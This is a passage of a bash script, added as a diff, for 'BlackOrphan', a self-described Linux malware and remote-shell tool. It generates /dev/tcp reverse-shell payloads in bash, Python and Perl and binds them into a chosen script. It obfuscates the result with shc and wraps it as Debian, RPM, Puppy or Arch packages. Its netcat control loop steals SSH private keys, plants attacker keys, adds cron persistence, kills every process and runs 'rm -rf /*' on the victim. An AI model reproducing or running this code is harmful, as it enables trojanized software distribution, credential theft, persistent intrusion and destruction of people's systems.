@@ -1,0 +1,1408 @@
+#!/bin/bash
+#   Copyright 2015-2016
+#
+#  Author [73mp74710n]
+#  Email [<73mp74710n@sagint.com>]
+#
+#
+#
+#[LICENSE]
+#   This program is free software; you can redistribute it and/or modify
+#   it under the terms of the GNU General Public License as published by
+#   the Free Software Foundation; either version 2 of the License, or
+#   (at your option) any later version.
+#
+#   This program is distributed in the hope that it will be useful,
+#   but WITHOUT ANY WARRANTY; without even the implied warranty of
+#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#   GNU General Public License for more details.
+
+#set -x #( Do not Uncomment this line if you have no idea what it does )
+#Script Name:- BlackOrphan
+#Description:- Black Orphan is Majorly a tool for gaining remote shell access into a linux Operting system, BlackOprphan acts as a malware and it's still undergoing development
+#Usage:- BlackOrphan
+#############################################################################
+##
+##				BLACKORPHAN V0.2
+##
+#############################################################################
+################################     VARIABLES	 ############################
+
+author="73mp74710n"
+team="Nigeria Cyber Army"
+eaddress="zombieleetnca@gmail.com"
+bar===============================
+opt="-n1"
+PS2="BlackOrphan>"
+prompt="${PS2}"
+PS2="BlackOrphan"
+createserver="${PS2}:create_server>"
+vnum="_"
+SPID="$$"
+############################COLOR CODES#####################################
+open="\e["
+close="\e[0m"
+bold="1;"
+light="0;"
+red="31m"
+green="32m"
+yellow="33m"
+#blue="34m"
+#white="1m"
+new="\n"
+CRYPT="${PWD}"
+#IF XPG_ECHO IS OFF, TURN IT ON
+[ ! -o xpg_echo ] && shopt -s xpg_echo
+
+###################################FUNCTIONS###################################
+#####CHECK IF USER IS ROOT
+#####IF USER IS ROOT RUN THIS SCRIPT, IF USER IS NOT EXIT THE SCRIPT
+is_root() {
+    [ $UID != 0 ] &&  echo "You are just an ordinary user (but mom loves you just the same)." \
+	&& exit 1
+}
+header() {
+    reset
+   cat <<"EOF"
+
+ ____  _            _     ___             _
+| __ )| | __ _  ___| | __/ _ \ _ __ _ __ | |__   __ _ _ __
+|  _ \| |/ _` |/ __| |/ / | | | '__| '_ \| '_ \ / _` | '_ \
+| |_) | | (_| | (__|   <| |_| | |  | |_) | | | | (_| | | | |
+|____/|_|\__,_|\___|_|\_\\___/|_|  | .__/|_| |_|\__,_|_| |_|
+                                   |_|
+                                      SHELL IS JUST THE BEGINNING
+
+EOF
+}
+##SCRIPT MAIN MENU
+main_menu(){
+    header
+    printf "${open}${bold}${green}BLACK ORPHAN LINUX HACK TOOL${close}\n"
+    printf "${open}${bold}${yellow}$bar${close}${new}"
+    printf "${open}${bold}${green}1. Create a server\n"
+    printf "2. Start a Listerner\n"
+    printf "3. About\n"
+    printf "q. Exit\n${close}"
+    printf "${open}${bold}${yellow}$bar"
+    printf "\nSelect from the menu\n\n"
+    printf "To quit hit the q button${close}\n"
+}
+#########ABOUT BLACK ORPHAN TOOL
+about(){
+    header
+    printf "BLACK ORPHAN\n\n"
+    printf "Copyright 2015 BLACK ORPHAN\n\n"
+    printf "Written by: %s\n\nTeam: %s\n\nEmail: %s\n\n" "$author" "$team" "$eaddress"
+    printf "####REQUIREMENT\n\n"
+    printf "* Shc\n"
+    printf "* Netcat\n"
+    printf "* Socat\n"
+    printf "* Brain\n\n"
+    printf "####Supproted Platform\n\n"
+    printf "* Linux\n"
+    echo ""
+    echo ""
+    echo -e "Hit Enter to continue"
+    echo ""
+    read
+    reset
+
+}
+##CHECK IF A VALUE IS INTEGER
+_intchk(){
+
+    local chk_int=$1
+    case $chk_int in
+	""|*[!0-9]* )
+	    echo "You inputed an invalid Port Number" && return 1
+	    ;;
+	*)
+	    : echo ""
+	    ;;
+    esac
+
+}
+
+set_usage(){
+    echo "Usage:- set lhost_lport [ip address of your computer] [any unfiltered port]"
+}
+###########################################################################################################################
+set_opt(){
+    if [ "$l_set" != "set" ];then
+	echo "Invalid Command"
+	set_usage
+	return 1
+    fi
+
+    if [ -z "$l_host" ];then
+
+	echo "No arguemnt was passed to set"
+	set_usage
+	return 1
+
+    elif [ "$l_host" != "lhost_lport" ];then
+
+	echo "Invalid set argument"
+	set_usage
+	return 1
+
+    fi
+}
+#####CONTROL FUNCTION IS REQUIRED FOR PROPER PACKAGING OF A DEBIAN PACKAGE
+control(){
+    while read line
+    do
+	$line
+    done << EOF > ${CUT_SHIT}$vnum$vnumber/DEBIAN/control
+echo Package: ${CUT_SHIT}
+echo Maintainer: <${email}>
+echo Version: $vnumber
+echo Architecture: all
+echo Description: $description
+EOF
+}
+
+control2(){
+    while read line
+    do
+	$line
+    done << EOF > ${mName}$vnum$vnumber/DEBIAN/control
+echo Package: ${mName}
+echo Maintainer: <${email}>
+echo Version: $vnumber
+echo Architecture: all
+echo Description: $description
+EOF
+}
+################PACKAGING RPM'S############################
+_spec(){
+    while read line
+    do
+	$line
+    done << EOF > ${HOME}/rpmbuild/SPECS/${CUT_IT}.spec
+set -f
+echo Name:                                      ${CUT_IT}
+echo Version:                                   ${vnumber}
+echo Release:                                   1%{?dist}
+echo Summary:                                   ${description}
+echo BuildArch:                                 noarch
+
+echo License:                                   GPL-2
+echo Source0:                                   %{name}-%{version}.tar.gz
+
+
+echo %description
+echo ${description}
+
+
+echo %prep
+echo %setup -q
+
+
+echo %install
+echo mkdir -p \$RPM_BUILD_ROOT/sbin
+echo cp -R * \$RPM_BUILD_ROOT/sbin
+
+
+echo %files
+echo /sbin
+echo %clean
+echo rm -rf \$RPM_BUILD_ROOT
+
+
+echo %post
+echo chown -R root:root /sbin/${CUT_IT}
+echo chmod 775 /sbin/${CUT_IT}
+
+EOF
+}
+##########NOTE:- THE CODE IN THIS FUNCTION WAS COPIED FROM createpet.sh##################
+createpet(){
+    PACKAGE_NAME=$(basename "${1}")
+    test ! -d "${PACKAGE_NAME}" \
+	&& echo "${PACKAGE_NAME} not found in current directory." \
+		"Move to the directory where ${PACKAGE_NAME} present" \
+		"and run this command." \
+		"exitting.." && exit 1
+
+    echo -n "Application Name[Default: ${PACKAGE_NAME%%-[0-9]\.*}] " \
+	&& read APPLICATION_NAME \
+	&& test -z "${APPLICATION_NAME}" && APPLICATION_NAME="${PACKAGE_NAME%%-[0-9]\.*}"
+
+    echo -n "Comment[Default: ${PACKAGE_NAME} pet package] " \
+	&& read COMMENT \
+	&& test -z "${COMMENT}" && COMMENT="${PACKAGE_NAME} pet package"
+
+    echo -n "Dependency packages[seperated by ','] " && read DEPENDENCIES
+
+    echo -n "Registered(yes/no)[Default: yes] " && read REGISTER \
+	&& test -z "${REGISTER}" && REGISTER="yes"
+
+    if test ! -z "${XDGMENU}"
+    then
+
+	echo
+	echo "[Creating /usr/share/applications/${APPLICATION_NAME}.desktop]"
+	echo
+
+	test ! -d "${PACKAGE_NAME}/usr/share/applications" \
+	    && mkdir -p "${PACKAGE_NAME}/usr/share/applications"
+
+	echo -n "Path to locate Icon file[Default: /usr/lical/lib/X11/mini-icons/x16.xpm] " \
+	    && read ICON_PATH \
+	    && test -z "${ICON_PATH}" && ICON_PATH="/usr/local/lib/X11/mini-icons/x16.xpm"
+
+	echo -n "Commandline to Execute[Default: rxvt -e ${APPLICATION_NAME} --help] " \
+	    && read COMMANDLINE \
+	    && test -z "${COMMANDLINE}" && COMMANDLINE="rxvt -e ${APPLICATION_NAME} --help"
+
+	echo -n "Menu Category:
+	$(grep Categories /usr/share/applications/* | cut -d':' -f2 | cut -d'=' -f2 | tr '\n' ',')
+	[Default: Utility] " \
+	    && read CATEGORY \
+	    && test -z "${CATEGORY}" && CATEGORY="Utility"
+
+	# Name and entries are taken from the .desktop files present in
+	# /usr/share/applications/
+
+	XDG_DESKTOP_FILE_CONTENT="[Desktop Entry]
+	Encoding=UTF-8
+	Name=${APPLICATION_NAME}
+	Icon=${ICON_PATH}
+	Comment=${COMMENT}
+	Exec=${COMMANDLINE}
+	Terminal=false
+	Type=Application
+	Categories=${CATEGORY}
+	GenericName=${APPLICATION_NAME}"
+
+	echo "${XDG_DESKTOP_FILE_CONTENT}" \
+	    | tee "${PACKAGE_NAME}/usr/share/applications/${APPLICATION_NAME}.desktop"
+
+    fi
+
+    echo
+    echo "[Creating ${PACKAGE_NAME}.files file]"
+
+    find "${PACKAGE_NAME}" \
+	| sed -e"s%^${PACKAGE_NAME}%%g" \
+	| tee "${PACKAGE_NAME}.files"
+    mv -f "${PACKAGE_NAME}.files" "${PACKAGE_NAME}"
+
+    echo
+    echo "[Creating ${PACKAGE_NAME}.pet.specs file]"
+    echo
+
+    PET_SPECS="PUPAPPLICATION='${APPLICATION_NAME}'
+PETMENUDESCR='${COMMENT}'
+PETOFFICIALDEPS='${DEPENDENCIES}'
+PETREGISTER='${REGISTER}'"
+    echo "${PET_SPECS}" | tee "${PACKAGE_NAME}/${PACKAGE_NAME}.pet.specs"
+
+    echo
+    echo "[Creating ${PACKAGE_NAME}.tar file]"
+    echo
+
+    tar cvf "${PACKAGE_NAME}.tar" "${PACKAGE_NAME}"
+
+    echo
+    echo "[Creating ${PACKAGE_NAME}.tar.gz file]"
+    echo
+
+    # This is how dir2pet doing, I slightly modified.
+
+    echo "gzipping..." && gzip "${PACKAGE_NAME}.tar"
+    echo "md5summing..." && md5sum "${PACKAGE_NAME}.tar.gz" | cut -d ' ' -f 1 >> "${PACKAGE_NAME}.tar.gz"
+    echo "renaming..." && mv -f "${PACKAGE_NAME}.tar.gz" "${PACKAGE_NAME}.pet"
+    echo "${PACKAGE_NAME}.pet Created..."
+
+
+}
+################################PACKAGING ARCH LINUX PKG PACKAGES###########################
+_pkgbuild(){
+    while read line
+    do
+	$line
+    done << EOF > PKGBUILD
+echo # Maintainer: Your Name <${email}>
+echo pkgname=${CUT_IT}
+echo pkgver=${vnumber}
+echo pkgrel=1
+echo pkgdir=/usr/local/bin
+echo pkgdesc="${description}"
+echo arch=('any')
+echo license=('GPL')
+echo source=("\$pkgname-\$pkgver.tar.gz")
+EOF
+}
+
+bCommand(){
+    shopt -s nocasematch
+    while printf "[reverseShell:BlackOrphan]: "; read own3d deta
+    do
+	case $own3d in
+	    "")  echo "${open}${bold}${red}Type help if you don't know what to do${close}"
+		 continue
+		 ;;
+	    help)
+
+		printf "HELP COMMANDS\n\n"
+		printf "\tinfo [COMMAND]\tSHOWS YOU A SHORT INFORMATION ABOUT A COMMAND\n\n"
+		printf "\thelp [COMMAND]\tTYPING ONLY 'help' SHOWS YOU THIS BABY,TYPING HELP WITH A COMMAND SHOWS YOU HOW TO USE A COMMAND\n\n"
+
+		printf "NETWORK COMMANDS\n"
+		printf "\tifconfig\tSHOWS WHAT THE NORMAL IFCONFIG COMMAND WILL SHOW ON A LINUX BOX\n\n"
+
+		printf "RUN SH.T\n\n"
+		printf "\tremove_sys\tREMOVES EVERYTHING ON THE SYSTEM\n\n"
+		printf "\tget_ssh\t\tGET'S THE SHH PUB-KEY AND PRIV-KEY\n\n"
+		printf "\tput_ssh\t\tPUT YOUR SSH KEYS ON THE TARGET authroized_keys\n\n"
+        printf "\tlogin_ssh\t\LOGIN TO TARGETS WITH SSH, YOU MUST RUN PUT_SSH BEFORE THIS\n\n"
+		printf "\tkill_all\tKILLS ALL PROCESS ON THE TARGETS COMPUTERS\n\n"
+		printf "\tpersistent\tONE'S THE TARGET BOOTS UP, YOU CAN CONNECT\n\n"
+		printf "\tdrop_shell\t\tGives you a shell access on the target box\n\n"
+
+		printf "ABOUT TARGET\n\n"
+		printf "\tsysinfo\t\tSHOWS YOU INFORMATION ABOUT THE TARGET\n\n"
+		printf "\tprocess\t\tSHOWS ALL PROCESS RUNNING ON TARGETS COMPUTER\n"
+		printf "\tsystem\t\tRUNS THE SPECIFIED ARGUMENT ON THE TARGETS COMPUTER\n"
+
+		;;
+	    info)
+		case $deta in
+		    "") echo "${open}${bold}${yellow}[!]Info What${close}"
+			continue
+
+			;;
+		    ifconfig) echo "TYPING ONLY 'ifconfig' WILL OUTPUT WHAT THE NORMAL IFCONFIG COMMAND WILL OUPUT ON A LINUX BOX"
+			      continue;;
+		    sysinfo) echo "TYPING 'sysinfo' WILL OUTPUT the [IPADDRESS, CURRENTUSER, HOSTNAME, UNAME]"
+			     continue ;;
+		    drop_shell) echo "TYPING 'drop_shell' WILL GIVE YOU A DIRECT SHELL ACCESS TO THE LINUX BOX"
+				continue;;
+		    persistent) echo "TYPING 'persistent' WILL CREATE A CRONJOB FOR BLACKORPHAN"
+				continue;;
+		    put_ssh) echo "TYPING 'put_ssh' PUTS YOUR PUBLIC SSH KEY ON THE TARGETS AUTHROIZED_KEYS"
+			     continue ;;
+		    get_ssh) echo "TYPING 'get_ssh' SAVES THE TARGET PUBLIC KEYS AND PRIVTATE KEY IN \
+\nROOTPRIVKEY AND ROOTPUBKEY FOR ROOT USER, FOR NONE ROOT USERS IT SAVES IN PUBKEY.TXT AND PRIVKEY.TXT"
+			     continue ;;
+            login_ssh) echo "TYPING 'login_ssh' CREATE AN SSH SECTION TO THE TARGET" 
+                continue ;;
+		    info) echo "TYPING 'info' SHOWS THE INFORMATION ABOUT A COMMAND "
+			  continue ;;
+		    process) echo "TYPING 'process' SHOWS ALL THE RUNNING PROCESS IN THE TARGETS COMPUTER "
+			     continue ;;
+		    help) echo "TYPING 'help' SHOWS YOU HOW TO USE THE COMMANDS"
+			  continue ;;
+		    kill_all) echo "TYPING 'kill_all' KILLS ALL PROCESS IN THE TARGETS COMPUTER"
+			      continue ;;
+		    remove_sys) echo "TYPING 'remove_sys' RUNS RM -RF / ON THE TARGETS COMPUTER"
+				continue ;;
+		    exit) echo "TYPING 'exit' CLOSE THE CONNECTION"
+			  continue ;;
+		    system) echo "TYPING 'system' AND AN ARGUMENT ( VALID COMMAND ) RUNS THE COMMAND ON THE TARGETS BOX"
+			    continue ;;
+		    clear) echo "TYPING 'clear' CLEARS THE SCREEN"
+			   continue ;;
+		    
+		    
+		    *) echo "${open}${bold}${red}I don't understand that option ${close}"
+		       continue ;;
+		esac
+		;;
+
+	    ifconfig)
+		echo "ifconfig" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+		;;
+	    sysinfo) sysipaddress=$(echo "ip route" |\
+					   timeout --foreground --signal=TERM .9  nc -lnvp "$l_port" 2>/dev/null|\
+					   sed 's/src/\nsrc/' | grep src | egrep -m 1 -o "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}")
+
+		     sysuser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
+		     syshostname=$(echo "hostname" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
+		     sysuname=$(echo "uname -srv" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
+		     echo "IPADDRESS: - ${sysipaddress}"
+		     echo "USER:- ${sysuser}"
+		     echo "HOSTNAME:- ${syshostname}"
+		     echo "UNAME:- ${sysuname}"
+		     ;;
+	    process) echo "ps aux" | timeout --foreground --signal=TERM .9  nc -lnvp "$l_port" 2>/dev/null
+		     continue
+		     ;;
+	    kill_all) echo "kill -9 1" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+		      continue
+		      ;;
+	    get_ssh)
+		get_sshUser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
+		get_sshfunc(){
+
+		    local chicken=$(echo "ls /home/${get_sshUser}/.ssh/*.pub" | \
+					   timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep .pub$)
+
+		    echo "cat ${chicken}" | \
+			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a pubkeys.txt
+
+
+		    echo "cat ${chicken%.*}" | \
+			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a privkeys.txt
+
+		    printf "\n\n${open}${bold}${green}ssh keys has been copied to pubkeys.txt and privkeys.txt${close}\n"
+		}
+		get_sshfunc2(){
+		    local theWalkingDead=$(echo "ls /root/.ssh/*.pub" | \
+						  timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep .pub$)
+
+		    echo "cat ${theWalkingDead}" | \
+			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a rootpubkeys.txt
+
+		    echo "cat ${theWalkingDead%.*}" | \
+			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a rootprivkeys.txt
+
+		    echo "\n\n${open}${bold}${green}ssh keys has been copied to rootpubkeys and rootprivkeys.txt${close}\n"
+		}
+
+
+
+		if test "${get_sshUser}" == "root";then
+
+		    if echo "ls -a /root/ " |\
+                            timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep ^.ssh &>/dev/null;then
+
+			get_sshfunc2;
+
+		    else
+			echo "ssh keys not found"
+			echo "generation ssh keys on target machine"
+			echo "ssh-keygen -N '' -f /root/.ssh/${get_sshUser}" | \
+                            timeout --foreground --signal=TERM 6s nc -lnvp "$l_port" 2>/dev/null
+			get_sshfunc2;
+		    fi
+		else
+		    if echo "ls -a /home/${get_sshUser}" |\
+			    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep ^.ssh &>/dev/null;then
+                
+			get_sshfunc;
+
+		    else
+			echo "${open}${bold}${yellow}ssh keys not found${close}" 
+			echo "${open}${bold}${green}Creating ssh keys ${close}"
+			timeout --foreground --signal=TERM 6s nc -lnvp "$l_port" 2>/dev/null
+			echo "ssh-keygen -N '' -f /home/${get_sshUser}/.ssh/${get_sshUser}" | \
+                            timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+			get_sshfunc;
+		    fi
+		fi
+		continue
+		;;
+	    put_ssh)
+		declare -g put_sshIp=$(echo "ip route" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| \
+				   sed 's/src/\nsrc/' | grep src | egrep -m 1 -o "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}")
+		declare -g put_sshUser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
+		login_ssh(){
+		    shopt -s nocasematch
+		    while printf "Establish an ssh Session:[y|n] " ; read estherBlish junk
+		    do
+			case $estherBlish in
+			    "") echo "${open}${bold}${red}Nothing was inputed${close}" ; continue ;;
+			    y)
+				echo "${open}${bold}${green}If put_ssh worked properly you won't be asked for a password${close}"
+				sleep 3s
+				xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@${put_sshIp}"
+				break ;;
+			    n)  break ;;
+			esac
+		    done
+
+		}
+
+		while printf "location of your public ssh key: " ; read sandwhich
+		do
+		    if [ -z "${sandwhich}" ];then
+			echo "${open}${bold}${red}An input is required${close}"
+			continue
+		    else
+			if ! file ${sandwhich} | grep 'public key' &>/dev/null;then
+			    echo "${open}${bold}${red}This is not a valid pub ssh file${close}"
+			    continue
+			else
+			    pubsshkey=$(<"${sandwhich}")
+			    echo "${open}${bold}${green}Adding Your pub ssh key to authroized_keys of target"
+			    if test "${put_sshUser}" == "root";then
+				echo "eval echo ${pubsshkey} >> /root/.ssh/authorized_keys" | \
+                                    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+				echo "${open}${bold}${green}SSH KEYS HAS BEEN COPIED ${close}"
+				login_ssh;
+				continue 2
+
+			    else
+				echo "eval echo ${pubsshkey} >> /home/${put_sshUser}/.ssh/authorized_keys" |\
+                                    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+				echo "${open}${bold}${green}SSH KEYS HAS BEEN COPIED ${close}"
+				login_ssh;
+				continue 2;
+			    fi
+			fi
+
+		    fi
+		done
+		;;
+        login_ssh)
+            {
+                [[ ${put_sshIp} == "" ]] || [[ ${put_sshUser} == "" ]]
+            } && {
+                echo "${open}${bold}${red}Run put_ssh ${close}"
+            }  || {
+                xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@${put_sshIp}"
+            }
+        ;;
+	    remove_sys)
+		echo "rm -rf /*" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+		continue
+		;;
+	    persistent)
+		cronJ=$(echo "${0}" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null\
+                               | grep ^ | awk -F ":" '{ print $1}')
+		echo "${open}${bold}${green}Creating a cron file ${cronJ}${close}"
+		sleep 2
+		echo "eval echo '\'*\' \'*\' \'*\' \'*\' \'*\' root \'bash\' ${cronJ}' > ~/cronJobs" | \
+                    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+		
+		echo "${open}${bold}${green}Done${close}"
+		echo "${open}${bold}${green}Installing the CronFile${close}"
+		echo "crontab cronJobs" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+		echo "${open}${bold}${green}Done${close}"
+		echo "${open}${bold}${green}Cleaning UP${close}"
+		echo "rm cronJobs" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
+		echo "${open}${bold}${green}Done${close}"
+		continue
+		;;
+		clear) clear;;
+		system)
+				if [ -z "${deta}" ];then
+					printf "\n${open}${bold}${red}what system command do you want to run ?${close}\n"
+				else
+					echo "${deta}" | \
+							timeout --foreground --signal=TERM .9  nc -lnvp "$l_port" 2>/dev/null
+				fi
+		;;
+	    drop_shell) break;;
+	    exit) exit;;
+	    *) echo "${open}${bold}${red}I don't know this command${close}"
+	       ;;
+	esac
+
+    done
+
+
+
+}
+##BOX3D FUNCTION
+box3d(){
+    ##WHEN THE BOX3D FUNCTION IS CALLED, IT SHOULD CHECK IF THERE IS CONNECTION
+    ##IF THERE IS NO CONNECTION RETRY AGAIN, UNTIL CONNECTION IS ESTABLISHED
+
+    local reg="[yY]"
+    printf "${open}${light}${green}Start the Listener now [yY|nN]:${close} " ; read  $opt -e startL
+
+    [[ ${startL} =~ ${reg} ]] || \
+	{
+	    reset ;  _select
+	}
+
+    reset
+    echo "${open}${light}${yellow}[!]Please Wait for Connection to be Established${close}"
+    while :
+    do
+	timeout .1 nc -lnvp "$l_port" > "/tmp/${0##*/}.${SPID}" 2>&1
+	grep -E "connect|accepted" "/tmp/${0##*/}.${SPID}" >/dev/null 2>&1
+	if [ $? != 0 ];then
+
+	    printf "${open}${light}${yellow}[!]Connection Not Yet Established${close}\n"
+
+	    printf "${open}${light}${red}Retrying${new}${close}"
+
+	    sleep 2
+
+	    reset
+
+	    continue
+
+	fi
+
+	break
+    done
+
+    rm "/tmp/${0##*/}.${SPID}" >/dev/null 2>&1
+    printf "${open}${light}${green}Connection Established${close}\n"
+    echo $'\a'
+    bCommand;
+    if [ "$( which socat )" ];then
+
+	socat - tcp-l:"$l_port",reuseaddr,fork
+
+    elif [ "$( which nc )" ];then
+
+	nc -lvp "$l_port"
+
+    fi
+    reset
+    header
+
+}
+###CREATE SERVER BANNER FUNCTION
+createserver_banner(){
+    header;
+    printf "${open}${bold}${green}Select the target Operating System${close}\n"
+    printf "${open}${bold}${yellow}===================================${close}\n"
+    printf "${open}${bold}${green}1. Debian base linux system\n"
+    printf "2. Rpm base Linux system\n"
+    printf "3. Puppy Linux (.pet)\n"
+    printf "4. Arch Linux \n"
+    printf "r. Run\n"
+    printf "b. Go back to previous menu\n"
+    printf "q. Exit${close}\n"
+    printf "${open}${bold}${yellow}===================================${close}\n\n"
+    printf "${open}${bold}${red}It is best you create a debian package and\n\
+convert it with alien to support your targeted distro${close}\n"
+}
+
+###THE SELECT FUNCTION
+_select(){
+    main_menu
+    while printf "${open}${bold}${green}${prompt}${close} " ; read $opt selct
+    do
+	case $selct in
+	    1)	createserver && break ;;
+	    2)	while printf "${open}${bold}${green}\nEnter port to connect to: ${close}" ; read l_port junk
+		do
+		    if [ -z "$l_port" ];then
+			printf "${open}${bold}${red}[!]Connection Port is Empty${close}\n"
+			continue
+		    fi
+
+		    ! _intchk "${l_port}"
+
+		    if [ -n "$l_port" ];then
+			break
+		    fi
+
+		done
+
+		reset && box3d && break
+
+		;;
+
+
+	    3)
+		about && main_menu ;;
+
+	    q)	printf "\n${open}${light}${yellow}Have a good boring life :)${close}\n" && exit $RANDOM ;;
+
+	    *)
+		reset
+		main_menu
+
+		printf "\n${open}${light}${yellow}[!]Invalid Selection <%s>${close}\n" "$selct"
+
+
+		;;
+	esac
+
+    done
+
+}
+
+chk_file() {
+
+
+		while printf "\n${open}${light}${green}Specify the script to bind with: ${close}" ; read bindscript
+		do
+		    if [ -z "$bindscript" ];then
+			printf "\n${open}${light}${yellow}[!]Path to the script to bind with is needed${close}\n"
+			continue
+		    fi
+
+		    if [ ! -e "${bindscript}" ];then
+			printf "\n${open}${light}${red}${bindscript}Does not exist${close}\n"
+			continue
+		    elif [ ! -f "${bindscript}" ];then
+			printf "\n${open}${light}${red}%s Is not a file${close}\n" "${bindscript}"
+			continue
+		    fi
+
+		    env='#!'"$(which env)"
+		    deadArray=\
+(
+"$(which bash)"
+"$(which dash)"
+"$(which ksh)"
+"$(which sh)"
+"$(which rbash)"
+"$(which tmux)"
+"$(which tcsh)"
+"$(which perl)"
+"$(which python)"
+)
+		    #####################################################################################################################
+
+		    for i in "${deadArray[@]}"
+		    do
+			#echo "#!${i}" > /dev/null 2>&1
+			head -1 "${bindscript}" | egrep -o "#\!$i|$env.$i" >/dev/null 2>&1
+			if [ $? = 0 ];then
+			    break 2
+			fi
+
+		    done
+
+		    #########################LONG LINE,I HAD TO CUT IT SHORT#######################
+		    printf \
+			"${open}${light}${yellow}%s${close}\n" \
+			"[!]Please put a shebang/hashbang at the beginning of the script you specified and try again"
+
+
+		    cd ../../../../ && rm -rf "$dirfile"
+		    exit 2
+
+		done
+
+		echo ""
+		getLast=${bindscript##*.}
+
+		cp "${bindscript}" "$(pwd)"
+
+		CUT_=${bindscript##*/}
+
+		CUT_IT=${CUT_%.*}
+
+		mv "${CUT_}" "${CUT_IT}"
+
+		python_perl_regex() {
+		    local regex="$1"
+
+		    cat "${CUT_IT}" >> "${dirfile}"
+		    sed -i "s/^#\!.*$(echo "${regex}")//g" "${dirfile}" #Striping off intereperter
+		    echo "!" >> "${dirfile}"
+		    cat "${dirfile}" >> "${CUT_IT}"
+		    mv "${dirfile}" "${CUT_IT}"
+		    chown root:root ./*
+		    chmod 775 ./*
+		}
+
+		crypt() {
+		    local type=$1 shc="${CRYPT}"/misc/shc/shc
+		    if [ ! -x "${shc}" ];then
+                (
+                    cd "${shc%%/shc*}" && \
+                    tar -xvf "${shc%%shc*}shc-3.8.7.tgz"
+                    mv "shc-3.8.7" "${shc##*/}"
+                    cd "${shc##*/}" && \
+                    {
+                        make || gcc shc.c shc || {
+                            printf "\n${open}${bold}${red}%s${close}\n" "Error while compiling shc " && exit 6
+                        }
+                    } ||  {
+                            printf "\n${open}${bold}${red}%s${close}\n" "Error while compiling shc " && exit 6
+                        }
+                )
+            fi
+
+		    printf "\n${open}${bold}${green}%s${type}\n" "Crypting the "
+		    "${shc}" -r -f "${CUT_IT}" && \
+			{
+			    rm "${CUT_IT}" && \
+				mv "${CUT_IT}.x" "${CUT_IT}" && \
+				rm "${CUT_IT}.x.c" && \
+				printf "${open}${bold}${green}%s${close}\n" "Done"
+			} || \
+			    { printf "${open}${bold}${red}%s${type}\n" "Fatal Error while crypting " && exit 2 ;}
+
+		}
+
+		case "${getLast}" in
+		    sh)
+			_sh
+			cat "${CUT_IT}" >> "${dirfile}"
+			mv "${dirfile}" "${CUT_IT}"
+			chown root:root ./*
+			chmod 775 ./*
+			crypt "shell script"
+			sleep 2
+
+			;;
+		    py)
+			_py
+			python_perl_regex "python"
+			crypt "python script"
+			;;
+		    pl)
+			_pl
+			python_perl_regex "perl"
+			crypt "perl script"
+			;;
+		esac
+
+	# 	break ;;
+  #
+	#     n|N)
+	# 	_sh
+	# 	break ;;
+  #
+	#     *) 	printf "${open}${light}${red}Invalid Response${close}\n"
+	# 	;;
+	# esac
+  #   done
+
+
+}
+
+replay(){
+
+    printf "${open}${light}${yellow}[!]Please Set up the Listener${close}\n"
+    sleep 2
+    createserver
+
+}
+
+_sh(){
+
+    {
+
+	printf "%s\n" "#!/bin/bash"
+	printf "{\n"
+	printf "while :\n"
+	printf "do\n"
+	printf "exec 5<>/dev/tcp/%s/%s\n" "$l_ip" "$l_port"
+	printf "while read line\n"
+	printf "do\n"
+	printf "\$line\n"
+	printf "done <&5 >&5 2>&1\n"
+	printf "done\n"
+	printf "} >/dev/null 2>&1 &\n"
+
+    } > "${dirfile}"
+}
+
+_py(){
+
+    {
+
+	printf "%s\n" "#!/bin/bash"
+	printf "%s\n" "python - << '!'"
+	printf "import subprocess\n"
+	printf "subprocess.call(['bash','-c', \"{ while :; do exec 5<>/dev/tcp/%s/%s; while read line; do \$line; done <&5 >&5 2>&1; done; } >/dev/null 2>&1 &\"])\n" "$l_ip" "$l_port"
+    } >"${dirfile}"
+
+}
+
+_pl(){
+
+    {
+	printf "%s\n" "#!/bin/bash"
+	printf "%s\n" "perl - << '!' "
+	printf "my @args = ( \"bash\", \"-c\", '{ while :; do exec 5<>/dev/tcp/%s/%s; while read line; \
+		do \$line; done <&5 >&5 2>&1; done ;} >/dev/null 2>&1 & ' ); system(@args);\n" "$l_ip" "$l_port"
+    } >"${dirfile}"
+
+}
+
+general(){
+    while /bin/true
+    do
+	printf "${open}${light}${green}%s>${close} " "${cservprompt}" ; read l_set l_host l_ip l_port junk
+	set_opt
+	(( $? != 0 )) && continue
+
+	if [ "$l_ip" = "127.0.0.1" ];then
+
+	    printf "${open}${bold}${red}Fatal Error: %s is not supported ${close}\n" "$l_ip" && \
+		exit $RANDOM
+
